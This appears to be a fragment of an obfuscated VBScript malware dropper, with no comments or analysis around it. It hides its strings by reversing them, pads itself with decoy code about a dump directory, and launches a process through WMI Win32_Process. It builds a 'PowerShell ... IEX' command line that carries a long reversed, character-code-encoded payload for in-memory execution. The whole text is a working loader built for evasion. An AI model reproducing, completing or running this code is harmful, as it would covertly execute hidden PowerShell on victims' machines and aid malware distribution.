Execute(E0x9C0x8E0x7B0x6C0x5E(")""sSecOrP_23NiW""( teG.E5x0C6x0B7x0E8x0C9x0ataDtcudorP = E5x0C6x0B7x0E8x0C9x0ataD TeS"))
Set isWin80x9C0x8E0x7B0x6C0x5E = Data0x9C0x8E0x7B0x6C0x5E.Methods_ (F0x9C0x8E0x7B0x6C0x5E). _
InParameters.SpawnInstance_(E0x9C0x8E0x7B0x6C0x5E(" "))
isWin80x9C0x8E0x7B0x6C0x5E.CommandLine = CO0x9C0x8E0x7B0x6C0x5E
isWin80x9C0x8E0x7B0x6C0x5E.ProcessStartupInformation = KeyOffset0x9C0x8E0x7B0x6C0x5E
Set KeyOutput0x9C0x8E0x7B0x6C0x5E = Data0x9C0x8E0x7B0x6C0x5E.ExecMethod_(F0x9C0x8E0x7B0x6C0x5E, isWin80x9C0x8E0x7B0x6C0x5E)
End Sub



Function C0x9C0x8E0x7B0x6C0x5E()
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
End If
SelectedExtension0x9C0x8E0x7B0x6C0x5E = Array (E0x9C0x8E0x7B0x6C0x5E("el"+"l"),J0x9C0x8E0x7B0x6C0x5E(),E0x9C0x8E0x7B0x6C0x5E("Po"+"W"))
SelectedBase0x9C0x8E0x7B0x6C0x5E = Join (SelectedExtension0x9C0x8E0x7B0x6C0x5E,"")
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
Else
End If
B0x9C0x8E0x7B0x6C0x5E(E0x9C0x8E0x7B0x6C0x5E(SelectedBase0x9C0x8E0x7B0x6C0x5E) & space(1) & ProcessExtension0x9C0x8E0x7B0x6C0x5E & E0x9C0x8E0x7B0x6C0x5E(f) + E0x9C0x8E0x7B0x6C0x5E("X`E`I"))
End Function



Function D0x9C0x8E0x7B0x6C0x5E()
f="|)G1TOFHS0UR7IF6Q(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)6VJE2SB1DL0TEMU7PY5ZU0UH201P3N90GVRW1ZZK6R5O66Z$(gnirtSteG.IICSA::]gnidocnE.txeT.metsyS[;)88,69,96,69,37,421,14,14,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),021,101,48,101,5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,2(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),64,76,58,94,07,75,07,84,84,86,56,63,04,93,301,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),501,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),38,25,45,101,5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),79,66,901,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),07,93,85,85,39,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,8(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,76,19,04,93,301,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),501,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),38,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,17,93,64,93,65,07,48,58,93,85,85,39,301,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),501,001,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,99,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),96,64,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),021,101,48,19,16,15,65,76,35,45,94,96,25,55,45,63,95,14,04,001,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),64,76,58,94,07,75,07,84,84,86,56,63,95,14,101,5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),801,79,201,63,44,93,301,2(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),601,64,001,79,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,801,121,79,08,74,901,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,99,64,5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),801,79,99,501,901,101,401,99,401,79,801,79,201,801,79,74,74,85,2(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),401,93,44,93,48,96,17,93,04,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,2(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,64,76,58,94,07,75,07,84,84,86,56,63,95,08,48,48,27,67,77,88,64,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),201,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),99,501,77,23,901,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,76,54,23,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),99,101,601,89,97,54,9(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,87,23,16,76,58,94,07,75,07,84,84,86,56,63,95,94,65,84,56,05,35,56,05,84,66,63,23,16,23,801,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,99,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),08,121,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),501,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),7(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),99,101,38,85,85,39,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,301,79,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)"
f=f+",79,77,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),501,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,08,101,99,501,8(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,38,64,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,87,64,901,101,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),121,38,19,95,14,05,55,84,15,23,44,39,101,2(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),121,48,801,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,99,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),08,121,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),501,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),7(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),99,101,38,64,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,87,64,901,101,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),121,38,19,04,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),99,101,601,89,97,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,48,85,85,39,901,7(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),96,19,23,16,23,94,65,84,56,05,35,56,05,84,66,63,95,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,501,7(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),18,54,23,94,23,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),7(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,99,54,23,901,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,99,64,101,801,301,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,301,23,2(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),901,(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,99,54,23,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,501,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),99,101,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,99,54,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),101,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),23,16,23,301,0(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),501,2(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),63,95,14,93,96,35,75,96,96,84,35,84,45,76,58,94,07,75,07,84,84,86,56,56,56,07,45,56,05,45,84,15,65,94,65,84,56,05,35,56,05,84,66,76,35,96,35,75,96,96,84,35,84,45,76,58,94,07,75,07,84,84,86,56,56,56,07,45,56,05,45,84,15,65,94,65,84,56,05,35,56,05,84,66,76,35,96,35,75,96,96,84,35,84,45,76,58,94,07,75,07,84,84,86,93,23,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),5(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)1,27,54,101,6(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),501,4(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C),78,16,45,76,58,94,07,75,07,84,84,86,63,16,45,76,58,94,07,75,07,84,84,86,63,04(@=G1TOFHS0UR7IF6Q(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)6VJE2SB1DL0TEMU7PY5ZU0UH201P3N90GVRW1ZZK6R5O66Z$;};)htgneL.Z60TLLLL02E$ ,0 ,Z60TLLLL02E$(etirW.KNJF1BI550A1$;)J3M55L4DM1Q0Q$(setyBteG.8FTU::F9YJ6B0GQFQ$ + )) gnirtS-tuO | 1&>2 10B8BPPB71LXC$ 5kpxsvroie-n((setyBteG.8FTU::F9YJ6B0GQFQ$ = Z60TLLLL02E$;)l$ ,0,4MTIQK0ZX1313$(gnirtSteG.)F9YJ6B0GQFQ$ emaNepyT- tcejbO-weN( = 10B8BPPB71LXC$;{"
f=Replace(f,"(0x3B4A5F6E7E8B9C)`(0x3B4A5F6E7E8B9C)","11")
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
EDX0x9C0x8E0x7B0x6C0x5E()
Else
strAux = Right(g_DumpDir, Len(g_DumpDir) - 2)
arrAux = Split(strAux, "\", -1) 
DriveName = "\\" & arrAux(0) & "\" & arrAux(1)
End If
End Function



Function EDX0x9C0x8E0x7B0x6C0x5E()
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
C0x9C0x8E0x7B0x6C0x5E()
Else
strAux = Right(g_DumpDir, Len(g_DumpDir) - 2)
arrAux = Split(strAux, "\", -1) 
DriveName = "\\" & arrAux(0) & "\" & arrAux(1)
End If
End Function